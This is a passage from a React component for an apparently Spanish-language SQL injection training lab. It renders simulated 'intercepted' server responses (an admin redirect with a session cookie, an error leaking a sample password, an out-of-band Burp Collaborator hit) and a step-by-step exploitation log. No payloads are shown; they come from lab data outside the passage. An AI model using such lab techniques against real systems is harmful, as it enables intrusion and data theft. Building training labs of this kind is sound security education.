                                                <FaBug className="animate-pulse" /> Respuesta del Servidor Interceptada
                                            </div>
                                            
                                            {/* Mocking actual response based on context */}
                                            <div className="bg-black/80 border border-red-900/30 p-4 rounded text-green-400/90 break-all shadow-inner overflow-x-auto whitespace-pre-wrap font-mono text-xs md:text-sm leading-relaxed mt-2 text-gray-300">
                                                {[11, 14].includes(activeLab.id) ? (
                                                     <div className="animate-pulse text-yellow-500">HTTP/1.1 200 OK<br/>[... Esperando respuesta... Latencia de servidor detectada (10,000ms)]</div>
                                                ) : activeLab.id === 2 ? (
                                                     <div><span className="text-green-500">HTTP/1.1 302 Found</span><br/>Location: /my-account?id=administrator<br/><br/>Set-Cookie: session=xyz123...</div>
                                                ) : activeLab.id === 13 ? (
                                                     <div className="text-red-400">HTTP/1.1 500 Internal Server Error<br/><br/>Unterminated string literal at character 52. Error converting 'S3cr3tP4ss' to string.</div>
                                                ) : [12, 15, 16, 17].includes(activeLab.id) ? (
                                                     <div className="text-blue-400">DNS Lookup Received at Burp Collaborator Server.<br/>Payload successfully triggered Out-Of-Band interaction.</div>
                                                ) : (
                                                     <div><span className="text-green-500">HTTP/1.1 200 OK</span><br/>Content-Type: text/html<br/><br/>&lt;!-- Backend Database Dump / SQL Syntax Altered --&gt;<br/>[+] {activeLab.payload} executed.</div>
                                                )}
                                            </div>
                                            <p className="mt-4 text-gray-400 text-xs md:text-sm italic border-t border-gray-800 pt-3">
                                                * El payload ha penetrado las validaciones. Revisa el análisis inferior para ver el desglose en profundidad.
                                            </p>
                                        </motion.div>
                                    )}
                                </AnimatePresence>

                            </div>
                        </div>

                        {/* Explicación Técnica (Análisis Step-By-Step) */}
                        <div className="mt-6 bg-gray-900/40 border-l-4 border-yellow-500 p-5 rounded-r relative overflow-hidden">
                            {/* Decorative background for steps */}
                            <FaCode className="absolute top-4 right-4 text-4xl text-yellow-500/5 opacity-50" />

                            <h4 className="text-yellow-500 text-sm md:text-base font-bold tracking-widest uppercase mb-4 flex items-center gap-2 border-b border-yellow-500/20 pb-3">
                                <FaCode /> Bitácora de Explotación Técnica
                            </h4>

                            {activeLab.steps ? (
                                <div className="mt-4 relative space-y-3">
                                    {activeLab.steps.map((step, index) => (
                                        <div key={index} className="flex gap-4 relative z-10 px-2 group">
                                            <div className="pt-1 flex-1">
                                                {step.text && (
                                                    <p className="text-sm md:text-base leading-relaxed mb-1 text-gray-200 text-justify">
                                                        <span className="text-yellow-500/80 mr-2 font-bold opacity-70">▹</span> 
                                                        {step.text.replace(/\s+/g, ' ')}
                                                    </p>
                                                )}
                                                {step.code && (
                                                    <div className="bg-[#050505] border border-gray-800 p-4 rounded-lg text-green-400 font-mono text-xs md:text-sm break-all shadow-xl block w-full relative group-hover:border-green-900/50 transition-colors my-4">
                                                        <div className="absolute top-0 left-0 w-1 h-full bg-green-500 rounded-l-md opacity-80"></div>
                                                        <span className="text-red-500 font-bold mr-2">root@hacker:~#</span> {step.code}
                                                    </div>
                                                )}
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            ) : (
                                <p className="text-sm md:text-base text-gray-300 leading-relaxed px-2 text-justify">
                                    <span className="text-yellow-500/80 mr-2 font-bold opacity-70">▹</span> {activeLab.analysis}
                                </p>
                            )}
                        </div>

                    </motion.div>
                </AnimatePresence>
            </div>

        </div>
    );
};

export default SQLInjectionLabs;
